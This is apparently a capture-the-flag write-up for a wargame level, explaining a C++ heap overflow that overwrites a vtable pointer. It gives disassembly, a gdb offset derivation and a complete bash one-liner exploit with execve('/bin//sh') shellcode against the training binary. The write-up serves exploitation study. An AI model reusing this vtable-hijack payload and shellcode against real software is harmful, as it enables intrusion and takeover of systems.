# Way to bonus0

## Core
A small C++ program around class `N`. `main` does `new N(5)` → `obj1`, `new N(6)` → `obj2`,
then `obj1->setAnnotation(argv[1])` which is `memcpy(obj1+4, argv[1], strlen(argv[1]))` with
**no length limit** (`strlen` measures, it does not cap) → heap overflow (same missing-check
idea as level6) of `obj1` into `obj2`. `main` then makes a **virtual call** on `obj2`,
`call *(*(obj2))`; overwrite `obj2`'s vtable pointer (its offset 0) and the whole triple
dereference redirects into shellcode we injected into `obj1`.

## Decisive disass (full: `disas main`, `disas _ZN1N13setAnnotationEPc`, `disas _ZN1NC2Ei`, `info functions`)
```
main:
<+131>: call setAnnotation      ; setAnnotation(obj1, argv[1]) — the overflow
<+136>: mov 0x10(%esp),%eax      ; eax = obj2          ) the virtual call:
<+140>: mov (%eax),%eax          ; eax = *(obj2)  = vtable ptr   call *(*(obj2))
<+142>: mov (%eax),%edx          ; edx = *(vtable) = vtable[0]
<+159>: call *%edx               ; hijacked here
setAnnotation(this, input):
<+12>: call strlen@plt           ; measures input length — NO limit, no cmp
<+20>: add  $0x4,%edx            ; dest = this+4 (annotation buffer)
<+37>: call memcpy@plt           ; memcpy(this+4, input, strlen(input)) — unbounded
N::N(int)  (_ZN1NC2Ei):
<+6>:  movl $0x8048848,(%eax)    ; vtable ptr stored at obj+0x00
<+18>: mov  %edx,0x68(%eax)      ; ctor int at obj+0x68 ; new N(0x6c)=108B object
```
Object layout: `+0x00` vtable ptr, `+0x04` annotation buffer (memcpy dest), size `0x6c`.
The virtual call is `(*(*obj2))()` — 3 derefs from `obj2`, so controlling `*(obj2)` (offset 0)
controls the whole chain.

## Exploit
- offset 108 (derivation, gdb): break `*0x8048650` (both objects built), `run AAA`.
  `obj1 = x/wx $esp+0x1c` = `0x804a008`, `obj2 = $ebx` = `0x804a078` → gap `0x70 = 112`.
  memcpy starts at `obj1+4`, so distance to `obj2`'s vtable ptr = `0x70 − 4 = 0x6c = 108`.
- Addresses: memcpy dest `obj1+4 = 0x804a00c` = **offset 0** of our input. Shellcode placed
  at offset 4 = `0x804a010`.
- Values / layout (112 bytes total):
  ```
  [off 0  =0x804a00c] shellcode ADDRESS  0x804a010 -> \x10\xa0\x04\x08   (4)
  [off 4  =0x804a010] execve("/bin//sh") shellcode                      (25)
  [off 29]            NOP \x90 padding                                   (79)
  [off 108=0x804a074] obj2 vtable-ptr overwrite  0x804a00c -> \x0c\xa0\x04\x08 (4)
  check: 4 + 25 + 79 + 4 = 112
  ```
- Why it works: at the virtual call `*(obj2)=0x804a00c` (planted), `*(0x804a00c)=0x804a010`
  (our "vtable[0]"), `call 0x804a010` → shellcode. The fake vtable at `0x804a00c` is just
  offset 0 of our buffer, which holds the shellcode pointer.
- null-free: copy length is `strlen(input)`, so a `\x00` would truncate the copy; both
  addresses and the 25-byte `execve("/bin//sh")` stub are null-free → all 112 bytes land.
- Delivery: input is **`argv[1]`** (`main+112..118` deref `argv[1]`); `/bin//sh` is `/bin/sh`
  word-aligned, shellcode runs in-process → no cat trick.
```bash
./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x90"*79 + "\x0c\xa0\x04\x08"')
```

## Diff from previous
level8 forged an "auth" flag by **heap feng-shui** (spray `strdup` chunks until one lands at
`auth_ptr+0x20`), then let `system("/bin/sh")` run — no injected code. level9 is a **C++ vtable
hijack**: like level6 the overflow comes from a copy with no length check (`memcpy` sized by
`strlen`), but here it overwrites `obj2`'s **vtable pointer**, so the virtual call
`call *(*(obj2))` jumps into **shellcode we injected on the heap** (first level needing a real
shellcode + fake vtable, rather than redirecting to an existing function/GOT entry).

